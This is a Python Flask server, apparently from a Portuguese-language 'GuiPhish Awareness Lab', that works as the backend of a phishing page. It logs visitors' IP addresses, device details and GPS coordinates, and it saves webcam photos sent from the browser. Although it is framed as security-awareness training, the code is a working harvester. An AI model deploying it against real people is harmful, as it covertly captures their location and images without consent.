import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

BANNER = r"""
   ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
  ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
  ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
  ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
  ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
   ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

        🔐 GuiPhish Awareness Lab
        🎣 Security Awareness Toolkit
        🐧 Running on Kali Linux
"""

def menu():
    print("\n[+] Escolha o modo do lab:\n")
    print("1) 📸 Simulação de permissão de câmera")
    print("2) 🌍 Simulação de permissão de localização")
    print("3) 🔄 Ambos / Completo")

    escolha = input("\nDigite a opção: ")

    if escolha == "1":
        return "camera"
    elif escolha == "2":
        return "localizacao"
    elif escolha == "3":
        return "completo"
    else:
        print("\n[!] Opção inválida. Iniciando em modo completo.\n")
        return "completo"

app = Flask(__name__)
CORS(app)

for pasta in ["logs", "fotos"]:
    if not os.path.exists(pasta):
        os.makedirs(pasta)

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/evento", methods=["POST"])
def evento():
    try:
        data = request.json or {}

        tipo = data.get("tipo", "desconhecido")

        if tipo == "camera" and app.config.get("MODO") not in ["camera", "completo"]:
            return jsonify({"status": "bloqueado", "mensagem": "Modo câmera não está ativo"}), 403

        if tipo == "localizacao" and app.config.get("MODO") not in ["localizacao", "completo"]:
            return jsonify({"status": "bloqueado", "mensagem": "Modo localização não está ativo"}), 403

        evento_log = {
            "timestamp_servidor": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": request.remote_addr,
            "tipo": tipo,
            "acao": data.get("acao", "N/A"),
            "status": data.get("status", "N/A"),
            "user_agent": data.get("userAgent", "N/A"),
            "platform": data.get("platform", "N/A"),
            "language": data.get("language", "N/A"),
            "timezone": data.get("timezone", "N/A"),

            "latitude": data.get("latitude", "N/A"),
            "longitude": data.get("longitude", "N/A"),
            "accuracy": data.get("accuracy", "N/A"),
            "google_maps": data.get("google_maps", "N/A"),
        }

        with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
            f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")

        print(f"\n[+] EVENTO REGISTRADO: {tipo} | {evento_log['status']} | IP: {request.remote_addr}")

        if tipo == "localizacao" and evento_log["latitude"] != "N/A":
            print(f"[+] Localização: {evento_log['latitude']}, {evento_log['longitude']}")
            print(f"[+] Google Maps: {evento_log['google_maps']}")

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"[-] Erro ao registrar evento: {e}")
        return jsonify({"status": "erro"}), 500

@app.route("/capture", methods=["POST"])
def capture():
    try:
        if app.config.get("MODO") not in ["camera", "completo"]:
            return jsonify({
                "status": "bloqueado",
                "mensagem": "Modo câmera não está ativo"
            }), 403

        data = request.json or {}

        if "image" not in data:
            return jsonify({
                "status": "erro",
                "mensagem": "Sem imagem"
            }), 400

        img_data = data["image"].split(",")[1]
        img_bytes = base64.b64decode(img_data)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        filename = f"fotos/{timestamp}.jpg"

        with open(filename, "wb") as f:
            f.write(img_bytes)

        info = {
            "timestamp_servidor": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": request.remote_addr,
            "user_agent": data.get("userAgent", "N/A"),
            "screen": data.get("screen", "N/A"),
            "platform": data.get("platform", "N/A"),
            "language": data.get("language", "N/A"),
            "timezone": data.get("timezone", "N/A"),
            "timestamp": data.get("timestamp", "N/A"),
            "arquivo": filename
        }

        with open(f"fotos/{timestamp}_info.json", "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2, ensure_ascii=False)

        print(f"\n[+] FOTO RECEBIDA! IP: {request.remote_addr}")
        print(f"[+] Arquivo salvo: {filename}")

        return jsonify({"status": "ok", "arquivo": filename}), 200

    except Exception as e:
        print(f"[-] Erro ao salvar foto: {e}")
        return jsonify({"status": "erro"}), 500

@app.route("/painel", methods=["GET"])
def painel():
    return "Painel bloqueado. Consulte os eventos localmente em logs/eventos.jsonl e fotos/.", 403

@app.route("/fotos", methods=["GET"])
def fotos_bloqueadas():
    return "Acesso bloqueado. As imagens ficam disponíveis apenas localmente no Kali.", 403

@app.route("/foto/<nome>", methods=["GET"])
def foto_bloqueada(nome):
    return "Acesso bloqueado. As imagens ficam disponíveis apenas localmente no Kali.", 403

if __name__ == "__main__":
    print(BANNER)

    modo = menu()
    app.config["MODO"] = modo

    print(f"\n[+] Modo selecionado: {modo.upper()}\n")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
